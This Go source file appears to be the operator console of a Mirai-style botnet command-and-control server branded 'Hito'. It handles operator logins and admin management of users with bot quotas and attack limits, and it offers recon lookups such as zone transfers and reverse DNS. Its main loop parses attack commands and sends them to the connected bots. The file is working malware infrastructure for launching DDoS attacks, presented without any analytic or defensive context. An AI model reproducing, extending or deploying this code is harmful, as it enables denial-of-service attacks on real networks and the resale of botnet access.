package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "io/ioutil"
    "strconv"
    "net/http"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    headerb, err := ioutil.ReadFile("hitobotnet.txt")
    if err != nil {
        return
    }


    header := string(headerb)
    this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))

    this.conn.Write([]byte("\033[2J\033[1;1H")) 
    this.conn.Write([]byte("\x1b[0;97mLoading into the \x1b[0;91mHito\x1b[0;97m terminal\r\n"))
    time.Sleep(time.Duration(1000) * time.Millisecond)
    this.conn.Write([]byte("\x1b[0;97mConnection \x1b[0;92mESTABLISHED \x1b[0;97mloading in \x1b[0;91mHito\r\n"))
    time.Sleep(time.Duration(1000) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1;1H")) 


    // Get username
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;97musername\033[0;97m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;37mpassword\033[0;97m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }


    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[0;91Incorrect login -=-\r\n"))
        this.conn.Write([]byte("\033[0;91mAnkit if this is you then hello\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write(append([]byte("\r\033[0;97mSetting up the \033[0;91mHito\033[0;97m terminal \033[91m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(100) * time.Millisecond)
    }

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d\007", BotCount))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.Write([]byte("\033[2J\033[1H")) //display main header
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n"))
    for {
        var botCatagory string
        var botCount int
        botCount = clientList.Count()
        this.conn.Write([]byte("\x1b[94m"+username+"\x1b[97m@\x1b[94mbotnet\x1b[1;91m# \033[0m"))
        cmd, err := this.ReadLine(false)

        if cmd == "cls" || cmd == "clear" {
            this.conn.Write([]byte("\033[2J\033[1;1H")) 
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }

        if userInfo.admin == 1 && cmd == "rmuser" || cmd == "RMUSER" {
            this.conn.Write([]byte("\033[01;91mUsername: \033[0;97m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[01;91mAre You Sure You Want To Remove \033[01;97m" + rm_un + "?\033[01;91m(\033[01;32my\033[01;91m/\033[01;91mn\033[01;91m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;91mUnable to remove users\r\n")))
            } else {
                this.conn.Write([]byte("\033[01;92mUser Successfully Removed!\r\n"))
            }
            continue
        }


            if err != nil || cmd == "WHOIS" || cmd == "whois" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/whois/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[96m: \r\n\x1b[96m" + locformatted + "\r\n"))
            }

            if err != nil || cmd == "PING" || cmd == "ping" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            
            url := "https://api.hackertarget.com/nping/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            }

        if err != nil || cmd == "tracer" || cmd == "TRACER" {                  
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[96mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            }

        if err != nil || cmd == "resolve" || cmd == "RESOLVE" {                  
            this.conn.Write([]byte("\x1b[96mWebsite (Without www.)\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            }

            if err != nil || cmd == "revdns" || cmd == "REVDNS" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "asnlookup" || cmd == "asnlookup" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            }

            if err != nil || cmd == "subcalc" || cmd == "SUBCALC" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            }

            if err != nil || cmd == "ztransf" || cmd == "ZTRANSF" {
            this.conn.Write([]byte("\x1b[96mIP Address Or Website (Without www.)\x1b[0m: \x1b[96m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            }

        botCount = userInfo.maxBots
        t := time.Now()
        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte(t.Format("15:04:05")+" | Enter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte(t.Format("15:04:05")+" | Enter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte(t.Format("15:04:05")+" | Enter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", t.Format("15:04:05")+" | Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Max attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", t.Format("15:04:05")+" | Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", t.Format("15:04:05")+" | Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte(t.Format("15:04:05")+" | New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", t.Format("15:04:05")+" | Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1m"+t.Format("15:04:05")+" | User added successfully.\033[0m\r\n"))
            }
            continue
        }
        if userInfo.admin == 1 && cmd == "bots" {
            m := clientList.Distribution()
            for k, v := range m {
                t := time.Now()
                this.conn.Write([]byte(fmt.Sprintf("\033[0;97m"+t.Format("15:04:05")+" | %s:\t%d\033[0m\r\n", k, v)))
            }
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                t := time.Now()
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m"+t.Format("15:04:05")+" | Failed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                t := time.Now()
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m"+t.Format("15:04:05")+" | Bot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
       if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
